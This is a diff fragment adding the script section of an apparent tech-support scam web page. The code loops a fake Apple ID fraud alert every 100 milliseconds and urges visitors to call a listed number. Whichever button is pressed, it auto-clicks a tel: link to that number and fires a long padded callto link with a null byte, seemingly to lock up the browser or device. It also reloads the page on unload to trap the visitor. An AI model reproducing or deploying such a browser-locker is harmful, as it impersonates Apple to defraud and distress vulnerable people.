+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-903-3067"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-903-3067 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
